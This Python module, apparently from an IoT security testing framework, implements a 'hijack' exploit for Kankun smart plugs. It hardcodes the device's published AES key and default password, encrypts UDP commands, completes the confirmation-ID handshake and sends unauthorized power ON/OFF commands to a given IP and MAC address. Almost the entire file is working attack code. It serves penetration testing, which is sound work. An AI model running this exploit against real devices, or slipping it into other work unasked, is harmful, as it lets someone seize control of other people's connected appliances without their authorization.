"""Support for hijacking a Kankun smart plug."""

import re
import socket

from cryptography.hazmat.backends import default_backend

# from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import (
    Cipher,
    algorithms,
    modes,
)

from expliot.core.common import bstr
from expliot.core.tests.test import TCategory, Test, TLog, TTarget

DEFAULT_PORT = 27431
DEFAULT_PASS = "nopassword"
AES_KEY = b"fdsl;mewrjope456fds4fbvfnjwaugfo"


# These responses can be used for testing.
# Response 1 - with confirm ID
# R1 = b"\xc4\x2c\xb8\x27\x6a\xeb\x4e\xf5\x01\x94\x3c\x31\xc2\x07" \
#     b"\xfb\x1c\x7e\x0a\x54\x6a\x05\xe7\xe7\xa7\x68\xf5\xae\x89" \
#     b"\x55\xbd\x29\xa4\x62\x0e\x5f\x50\xa9\xef\x5c\xef\x74\xa3" \
#     b"\xc5\xe2\x48\xfb\x1f\x12\xb3\xc4\x27\xdb\x5f\xd5\x11\x96" \
#     b"\x80\x7d\x74\xd9\xd2\x4e\xd5\xfc"

# Response 2 - ACK
# R2 = b"\xc4\x2c\xb8\x27\x6a\xeb\x4e\xf5\x01\x94\x3c\x31\xc2\x07" \
#     b"\xfb\x1c\x7e\x0a\x54\x6a\x05\xe7\xe7\xa7\x68\xf5\xae\x89" \
#     b"\x55\xbd\x29\xa4\x01\x32\x48\xa8\x04\xaf\x36\x8f\xbb\xe5" \
#     b"\xb2\xc6\x84\xc8\x8b\x4d\x6e\xda\x4d\xdd\xf9\xc8\xaa\x94" \
#     b"\xfb\x37\x31\x1c\x1e\xe3\x5c\x62"



class KHijack(Test):
    """Tests for Kankun smart plugs.

    Output Format:
    [
        {
            "command": "lan_phone%foobar...",
            "response": "lan_device%foorbar...confirmid#172345",
            "received_confirmation_id": 172345
        },
        {
            "command2": "lan_phone%foobar...",
            "response2": "lan_device%foorbar...,
        }
    ]
    """

    def __init__(self):
        """Initialize the test."""
        super().__init__(
            name="hijack",
            summary="Kankun Smart Plug Hijacker",
            descr="This test case connects to the Kankun smart plug and sends"
            "unauthorized switch ON/OFF commands to it. If you don't "
            "know the password, try with the default or sniff the network "
            "for UDP packets as the commands containing the password are "
            "broadcasted. You can decrypt the packets easily using the AES "
            "key which is published.",
            author="Aseem Jakhar and Sneha Rajguru",
            email="aseemjakhar@gmail.com",
            ref=["https://payatu.com/hijacking-kankun/"],
            category=TCategory(TCategory.UDP, TCategory.SW, TCategory.EXPLOIT),
            target=TTarget("kankun", "1.0", "ikonke.com"),
        )

        self.argparser.add_argument(
            "-r", "--rhost", required=True, help="IP address of Kankun smart plug"
        )
        self.argparser.add_argument(
            "-p",
            "--rport",
            default=DEFAULT_PORT,
            type=int,
            help=f"Port number of the smart plug service. Default "
            f"is {DEFAULT_PORT}",
        )
        self.argparser.add_argument(
            "-m",
            "--rmac",
            required=True,
            help="MAC address of Kankun smart plug. Use colon delimited format "
            "with hex digits in small letters, e.g., ff:ee:dd:00:01:02",
        )
        self.argparser.add_argument(
            "-w",
            "--passwd",
            default=DEFAULT_PASS,
            help=f"The password (if any) for Kankun mart plug. Default is the "
            f"string '{DEFAULT_PASS}'",
        )
        self.argparser.add_argument(
            "-c",
            "--cmd",
            required=True,
            help="The command to send to the smart plug. Valid commands are on/off",
        )

    @staticmethod
    def encrypt_decrypt(message, encrypt=True):
        """Encrypt/Decrypt a string using the known AES key of the smart plug.

        Args:
            message(bytes): The message to encrypt or decrypt
            encrypt(bool): True means encrypt (default), false means decrypt
        Returns:
            bytes: The encrypted/decrypted bytes

        """
        cipher = Cipher(
            algorithms.AES(AES_KEY), modes.ECB(), backend=default_backend()  # nosec
        )

        if encrypt is True:
            # For some reason cryptograpy padding (13 bytes \x0d i.e \r)
            # is not working and adding spaces at the end as padding works
            # padder = padding.PKCS7(algorithms.AES.block_size).padder()
            # padded_string = padder.update(message)
            # padded_string += padder.finalize()
            while len(message) % 16 != 0:
                message = message + b" "
            encryptor = cipher.encryptor()
            # cipher_text = encryptor.update(padded_string) + encryptor.finalize()
            return encryptor.update(message) + encryptor.finalize()

        decryptor = cipher.decryptor()
        return decryptor.update(message) + decryptor.finalize()


    def send_receive(self, ip_addr, port, message):
        """Send and then receive encrypted data to/from the smart plug.

        Args:
            ip_addr(str): The IP address of the smartplug
            port(int): Port number of the listening service
            message(str): The plaintext message
        Returns:
            bytes: The response received from the smart plug

        """
        response = None
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.connect((ip_addr, port))
            sock.settimeout(20)
            sock.send(self.encrypt_decrypt(message))
            response = sock.recv(1024)
            response = self.encrypt_decrypt(response, encrypt=False)
        except:
            TLog.fail("Couldn't receive/decrypt response.")
            raise
        finally:
            sock.close()
        return response

    def create_message(self, cmd, cid=None):
        """Create the command message to be sent to the the smart plug.

        Args:
            cmd(str): the command to send - open/close/confirm
            cid(str): confirmation id used in confirm command
        Returns:
            bytes: The command message

        """
        message = f"lan_phone%{self.args.rmac}%{self.args.passwd}"

        if cmd == "open":
            message = f"{message}%open%request"
        elif cmd == "close":
            message = f"{message}%close%request"
        elif cmd == "confirm":
            message = f"{message}%confirm#{cid}%request"
        return message.encode()

    @staticmethod
    def get_confirm_id(message):
        """Extract the confirmation ID from the response message.

        Args:
            message(bytes): The response message from the smart plug
        Returns:
            str: The confirmation ID, if found or None

        """
        # Get the confirmation ID number only!!
        confirmation_id = re.search(r"confirm#(\w+)", bstr(message))
        if confirmation_id is not None:
            return confirmation_id.group(1)
        return None

    def execute(self):
        """Execute the test."""
        TLog.generic(
            f"Sending unauthorized command ({self.args.cmd}) to Kankun smart "
            f"plug on ({self.args.rhost}) port ({self.args.rport})"
        )
        if self.args.cmd.lower() == "on":
            operation = "open"
        elif self.args.cmd.lower() == "off":
            operation = "close"
        else:
            self.result.setstatus(
                passed=False, reason=f"Unknown --cmd ({self.args.cmd})"
            )
            return

        message = self.create_message(operation)
        # Step 1: Send command and receive the confirmation ID response
        response = self.send_receive(self.args.rhost, self.args.rport, message)

        if response is None:
            self.result.setstatus(
                passed=False,
                reason=f"Communication error while sending message({message})",
            )
            return
        # Get the confirmation ID
        cid = self.get_confirm_id(response)

        if cid is None:
            self.result.setstatus(
                passed=False,
                reason=f"Couldn't extract confirmation ID from ({response})",
            )
            return
        self.output_handler(
            command=message, response=response, received_confirmation_id=cid
        )
        message = self.create_message("confirm", cid)
        # Step 2: Send confirmation command with the confirmation ID and receive ACK response
        response = self.send_receive(self.args.rhost, self.args.rport, message)
        if response is None:
            self.result.setstatus(
                passed=False,
                reason=f"Communication error while sending message({message})",
            )
            return
        self.output_handler(command2=message, response2=response)
